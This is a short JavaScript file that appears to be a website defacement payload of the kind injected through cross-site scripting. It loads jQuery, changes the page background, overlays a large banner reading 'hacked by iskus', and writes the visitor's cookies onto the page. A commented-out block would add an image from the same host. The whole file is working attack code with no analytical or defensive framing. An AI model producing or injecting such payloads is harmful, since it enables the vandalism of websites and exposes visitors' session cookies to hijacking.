var script = document.createElement('script');
script.src = 'http://code.jquery.com/jquery-1.7.2.min.js';
document.getElementsByTagName('head')[0].appendChild(script);
script.onload = function () {
    $(document).ready(function () {
        $('body').attr('style',"background:url(http://gruz.loc/images/bg6.gif)")
            .append($('<div style="z-index:10002;position:fixed;min-height:200px;padding:20px;border:10px outset rgba(128, 199, 78, 0.54);' +
            'background:url(http://gruz.loc/images/bg6.gif);box-shadow: 22px 28px 28px black,-15px -15px 29px rgba(128, 199, 78, 0.54);' +
            'text-align:center;width:95%;margin:-100px auto;top:45%;color:red;"></div>')
                .html('<span id="ht" style="color:#000;font: small-caps bold 99px Georgia;margin:20px auto;' +
                'text-shadow:-2px -2px 5px #f5fce3,0px 0px 29px rgba(141,255,0,0.98),1px 1px 9px #e5f7e4,7px 7px 0px black;width: 250px;"><b>hacked by iskus</b><br/></span>'));
        $('#ht').append('<span style="display:block;width:600px;margin:20px auto;font-size:30px;"><span style="font-size:40px;">your cookies:</span><br/><br/>' + document.cookie + '</span>');
        //$('body').append('<div style="z-index:10001;position:fixed;top:1%;left:1%;box-shadow:13px 5px 5px rgba(128, 199, 78, 0.54) inset;border-radius:230px;width:400px;height:400px;">' +
        //'<img src="http://gruz.loc/images/world.gif" style="border-radius: 160px;  border: 2px solid rgba(68, 243, 13, 0.54);" alt="ISKUS" /></div>')
    })}